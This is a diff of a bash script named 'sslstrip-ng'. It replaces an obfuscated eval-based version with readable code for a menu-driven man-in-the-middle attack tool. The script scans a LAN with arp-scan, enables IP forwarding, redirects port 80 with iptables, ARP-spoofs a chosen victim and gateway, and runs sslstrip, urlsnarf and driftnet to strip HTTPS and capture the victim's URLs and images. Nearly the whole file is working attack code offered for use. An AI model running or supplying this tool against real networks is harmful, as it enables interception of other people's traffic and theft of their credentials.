@@ -1,9 +1,121 @@
+#!/bin/bash
+
 # ┌─────────────────────────────────────────────────────────┐
 # │    CODED BY : JAYSON CABRILLAS SAN BUENAVENTURA         │
 # │    GITHUB   : https://github.com/mkdirlove              │
 # │    FACEBOOK : https://web.facebook.com/mkdirlove.git    │
 # └─────────────────────────────────────────────────────────┘
 
-z="
-";PGz='= "0';iGz='slee';WCz='080)';LEz='p  $';UBz=' JAY';pEz='ll d';EFz='rf, ';UCz='faul';EDz='inat';LBz='t."';MGz='ct';sFz='01] ';sDz='p_at';Xz='s sc';mCz='sys/';rCz='ard';aEz=' $if';Qz='prin';Sz='%b\n';vDz='rlsn';AGz='to u';wz='red ';QCz=' " g';nDz='3[0m';ABz='can,';kFz='o ba';mz='et "';UEz='urls';hBz=' htt';KBz='ftne';EGz=' " ┌';Wz=' Thi';hFz=' net';iFz='work';kBz='hub.';cz=' as ';gCz='ace';VEz='narf';IBz='f, &';jCz='o 1 ';aCz='e (d';Mz='then';xDz='t_at';PCz='way:';gBz='   :';qDz='atta';sEz='ies ';YFz='s of';NCz=' ip';CBz='stri';cCz='lt: ';RGz='| $a';BDz='p tc';RDz=' CTR';RCz='tip';Ez='udo(';yDz='ck()';VBz='SON ';NGz='[ $a';Vz='R!!!';nEz=' " I';WBz='CABR';GGz='ot@s';DBz='p, a';iz='fi';ZGz=' == ';rz='ng"';BCz=' └──';oDz=''\''';jEz='n -l';RBz='  CO';cGz='"2" ';HCz=' -p ';xCz='PRER';vz='Powe';XGz=' [[ ';WDz='/ st';aBz='ENAV';jz='}';iEz='-sca';TBz='BY :';rEz='denc';bCz='efau';gEz='0m'\''';PEz='_att';pz='slst';lEz='howt';xz='by a';tFz='Scan';bEz='scan';YGz='$act';gDz='ss E';KFz='ct t';lFz='ck t';ODz=' " [';qCz='forw';dDz=';33m';fCz='" if';HBz='snar';eEz='ng.\';MEz='gtip';hDz='NTER';az='t be';ZFz=' you';IEz='$ifa';mFz='o th';ECz='t() ';XFz='dres';DDz='dest';TCz=' (de';tCz='able';ZCz='rfac';sBz='/web';aFz=' tar';WEz='ce';rFz='k."';lGz='k_su';VDz='cel ';KDz='--to';wCz=' -A ';SDz='L + ';Gz='if [';Nz='clea';QGz='1" |';IFz=' " C';iCz=' ech';SEz='$por';PDz='+] P';mEz='o() ';XEz='drif';pCz='/ip_';TEz='t';Cz=' che';mDz='.\03';JDz='ECT ';OGz='ct =';nFz='e to';eDz=' [+]';MFz='netw';PFz='n fo';hCz='sudo';yFz='How ';ZDz='ing.';MBz=' ┌──';oBz='e   ';TFz=' " G';yCz='OUTI';YCz='inte';REz=' -l ';ADz='NG -';eCz='0): ';tEz='like';wFz='Star';ZEz='t -i';Dz='ck_s';Iz='EUID';SGz='= "1';Pz='logo';wBz='m/mk';pDz='arp_';JEz='ce -';FDz='ion-';MDz='t $p';dEz='anni';kz='() {';KGz='─╼ #';CCz='───┘';JFz='onne';fGz='o';SFz='s."';mBz='mkdi';yz='rp-s';eFz='ay I';RFz='rget';oEz='nsta';QDz='ress';jFz='."';pFz='hen ';hGz='"0" ';VGz='en';HDz='-j R';KCz='targ';qz='rip-';QEz='ack(';fEz='033[';bFz='get.';lz='figl';OCz='gate';ACz='git ';eBz='  GI';wDz='arf_';ez='." >';fz='&2';Yz='ript';bDz='$'\''\0';CFz=', ur';cDz='33[1';WFz='P ad';kEz='main';UDz=' can';GEz='poof';nz='    ';Kz='e 0 ';vBz='k.co';fFz='P of';MCz='P: "';ICz='" En';Uz='ERRO';fBz='THUB';FFz='& dr';TGz='" ]]';tz=' ""';Az='func';UFz='et t';CEz='rm -';NDz='ort';JCz='ter ';FBz='oof,';dz='root';CGz='00] ';YDz='niff';fDz=' Pre';QFz='r ta';tDz='tack';yEz=', ss';GCz='read';qFz='ttac';FEz='arps';YEz='tnet';iDz=' to ';HFz='et)"';hEz=' arp';dBz='   │';NEz='ssls';gFz=' the';hz=' 1';AFz='lstr';WGz='elif';HGz='er]─';BBz=' ssl';GDz=' 80 ';sz='echo';uFz='gets';kCz='> /p';BFz='ip, ';cFz='he g';wEz='et, ';iBz='ps:/';GBz=' url';bBz='ENTU';EEz=' -e ';cEz='t sc';GFz='iftn';cBz='RA  ';Hz='[ "$';jBz='/git';Oz='r';OFz=' sca';vFz='02] ';DEz='hold';vEz=' " (';Rz='tf "';uBz='eboo';LCz='et I';nBz='rlov';jGz='p 3';rDz='ck |';oCz='ipv4';TDz='C to';DGz='Exit';dFz='atew';PBz='"';DFz='lsna';VFz='he I';DCz='star';gz='exit';oFz='ol t';Zz=' mus';gGz='"00"';mGz='do';LGz=' " a';LFz='o a ';xFz='03] ';BGz='se"';JBz=' dri';AEz=' {';LDz='-por';Fz=') {';KEz='t $i';HEz=' -i ';OBz='───┐';jDz='t sn';aDz='.. "';XDz='op s';yBz='ove.';NFz='ork ';lBz='com/';kDz='iffi';Bz='tion';tBz='.fac';nCz='net/';Jz='" -n';aGz='"02"';IGz='[~]"';FGz='─[ro';SCz='port';IDz='EDIR';CDz='p --';XCz=': " ';vCz=' nat';bz=' run';rBz='OK :';XBz='ILLA';sCz=' ipt';pBz='  FA';uEz='..."';NBz='────';qEz='epen';VCz='t: 8';UGz='; th';EBz='rpsp';dCz='wlan';oz='   s';BEz=' xte';Lz=']]; ';SBz='DED ';JGz='" └─';uz=' "  ';eGz='"3" ';Tz='" " ';qBz='CEBO';dGz='"03"';lCz='roc/';kGz='chec';ZBz='N BU';uDz=' | u';OEz='trip';xBz='dirl';uCz='s -t';QBz=' │  ';lDz='ng..';bGz=' || ';YBz='S SA';FCz='{';xEz='arp-';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$Iz$Jz$Kz$Lz$Mz$z$Nz$Oz$z$Pz$z$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$z$gz$hz$z$iz$z$jz$z$Pz$kz$z$Nz$Oz$z$lz$mz$nz$nz$oz$pz$qz$rz$z$sz$tz$z$sz$uz$nz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$z$sz$uz$nz$MBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$OBz$PBz$z$sz$uz$nz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$nz$dBz$PBz$z$sz$uz$nz$QBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$nz$nz$dBz$PBz$z$sz$uz$nz$QBz$pBz$qBz$rBz$hBz$iBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$dBz$PBz$z$sz$uz$nz$BCz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$NBz$CCz$PBz$z$sz$tz$z$sz$tz$z$jz$z$DCz$ECz$FCz$z$Pz$z$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$z$GCz$HCz$ICz$JCz$OCz$PCz$QCz$RCz$z$GCz$HCz$ICz$JCz$SCz$TCz$UCz$VCz$WCz$XCz$SCz$z$GCz$HCz$ICz$JCz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$z$sz$tz$z$hCz$iCz$jCz$kCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$z$hCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$SCz$GDz$HDz$IDz$JDz$KDz$LDz$MDz$NDz$z$sz$tz$z$sz$ODz$PDz$QDz$RDz$SDz$TDz$UDz$VDz$WDz$XDz$YDz$ZDz$aDz$z$GCz$HCz$bDz$cDz$dDz$eDz$fDz$gDz$hDz$iDz$DCz$jDz$kDz$lDz$mDz$nDz$oDz$z$pDz$qDz$rDz$BBz$CBz$sDz$tDz$uDz$vDz$wDz$qDz$rDz$JBz$KBz$xDz$tDz$z$sz$tz$z$jz$z$pDz$qDz$yDz$AEz$z$hCz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$z$jz$z$NEz$OEz$PEz$QEz$Fz$z$hCz$BEz$CEz$DEz$EEz$NEz$OEz$REz$SEz$TEz$z$jz$z$UEz$VEz$PEz$QEz$Fz$z$hCz$BEz$CEz$DEz$EEz$UEz$VEz$HEz$IEz$WEz$z$jz$z$XEz$YEz$PEz$QEz$Fz$z$hCz$JBz$KBz$ZEz$aEz$gCz$z$jz$z$bEz$kz$z$Pz$z$sz$tz$z$GCz$HCz$bDz$cDz$dDz$eDz$fDz$gDz$hDz$iDz$DCz$cEz$dEz$eEz$fEz$gEz$z$hCz$BEz$CEz$DEz$EEz$hEz$iEz$jEz$z$kEz$z$jz$z$lEz$mEz$FCz$z$Pz$z$sz$nEz$oEz$pEz$qEz$rEz$sEz$tEz$uEz$z$sz$uz$PBz$z$sz$vEz$lz$wEz$xEz$bEz$yEz$AFz$BFz$FEz$GEz$CFz$DFz$EFz$FFz$GFz$HFz$z$sz$IFz$JFz$KFz$LFz$MFz$NFz$Mz$OFz$PFz$QFz$RFz$SFz$z$sz$TFz$UFz$VFz$WFz$XFz$YFz$ZFz$aFz$bFz$PBz$z$sz$TFz$UFz$cFz$dFz$eFz$fFz$gFz$hFz$iFz$jFz$z$sz$TFz$kFz$lFz$mFz$nFz$oFz$pFz$qFz$rFz$z$jz$z$kEz$kz$z$Pz$z$sz$ODz$sFz$tFz$aFz$uFz$PBz$z$sz$ODz$vFz$wFz$jDz$kDz$rz$z$sz$ODz$xFz$yFz$AGz$BGz$z$sz$ODz$CGz$DGz$PBz$z$sz$tz$z$sz$tz$z$sz$EGz$FGz$GGz$YDz$HGz$IGz$z$GCz$HCz$JGz$KGz$LGz$MGz$z$Gz$NGz$OGz$PGz$QGz$RGz$OGz$SGz$TGz$UGz$VGz$z$bEz$z$WGz$XGz$YGz$ZGz$aGz$bGz$YGz$ZGz$cGz$Lz$Mz$z$DCz$TEz$z$WGz$XGz$YGz$ZGz$dGz$bGz$YGz$ZGz$eGz$Lz$Mz$z$lEz$fGz$z$WGz$XGz$YGz$ZGz$gGz$bGz$YGz$ZGz$hGz$Lz$Mz$z$Pz$z$iGz$jGz$z$Nz$Oz$z$gz$z$iz$z$jz$z$kGz$lGz$mGz$z$kEz"
+
+# Check if running as root.
+function check_sudo() {
+  if [[ "$EUID" -ne 0 ]]; then
+    clear
+    logo
+    printf "%b\n" " ERROR!!! This script must be run as root." >&2
+    exit 1
+  fi
+}
+
+# Logo
+logo() {              
+    clear        
+    figlet "           sslstrip-ng"
+    echo ""
+    echo "      Powered by arp-scan, sslstrip, arpspoof, urlsnarf, & driftnet."
+    echo "       ┌─────────────────────────────────────────────────────────┐"
+    echo "       │    CODED BY : JAYSON CABRILLAS SAN BUENAVENTURA         │" 
+    echo "       │    GITHUB   : https://github.com/mkdirlove              │"
+    echo "       │    FACEBOOK : https://web.facebook.com/mkdirlove.git    │"
+    echo "       └─────────────────────────────────────────────────────────┘"
+    echo ""
+    echo ""
+}
+
+# Start sniffer
+start() {
+    logo
+    read -p " Enter target IP: " ip
+    read -p " Enter gateway: " gtip
+    read -p " Enter port (default: 8080): " port
+    read -p " Enter interface (default: wlan0): " iface
+    echo ""
+    sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
+    echo ""
+    echo " [+] Press CTRL + C to cancel / stop sniffing... "
+    read -p $'\033[1;33m [+] Press ENTER to start sniffing...\033[0m'
+    arp_attack | sslstrip_attack | urlsnarf_attack | driftnet_attack
+    echo ""
+}
+
+# Arpspoof
+arp_attack() {
+    sudo xterm -hold -e arpspoof -i $iface -t $ip  $gtip
+}
+
+# Sslstrip
+sslstrip_attack() {
+    sudo xterm -hold -e sslstrip -l $port
+}
+
+# urlsnarf
+urlsnarf_attack() {
+    sudo xterm -hold -e urlsnarf -i $iface
+}
+
+# Driftnet
+driftnet_attack() {
+    sudo driftnet -i $iface
+}
+
+# Scan for targets
+scan() {
+    logo
+    echo ""
+    read -p $'\033[1;33m [+] Press ENTER to start scanning.\033[0m'
+    sudo xterm -hold -e  arp-scan -l
+    main
+}
+
+# Stop sniffing
+howto() {
+    logo
+    echo " Install dependencies like..."
+    echo "  "
+    echo " (figlet, arp-scan, sslstrip, arpspoof, urlsnarf, & driftnet)"
+    echo " Connect to a network then scan for targets."
+    echo " Get the IP address of you target."
+    echo " Get the gateway IP of the network."
+    echo " Go back to the tool then ttack."
+}
+
+# Main function
+main() {
+    logo
+    echo " [01] Scan targets"
+    echo " [02] Start sniffing"
+    echo " [03] How to use"
+    echo " [00] Exit" 
+    echo ""
+    echo ""
+    echo " ┌─[root@sniffer]─[~]"
+    read -p " └──╼ # " act
+
+    if [[ $act == "01" || $act == "1" ]]; then
+    scan
+    elif [[ $act == "02" || $act == "2" ]]; then
+    start
+    elif [[ $act == "03" || $act == "3" ]]; then
+    howto
+    elif [[ $act == "00" || $act == "0" ]]; then
+    logo
+    sleep 3
+    clear
+    exit
+    fi
+}
+
+# Argument start here
+check_sudo
+main
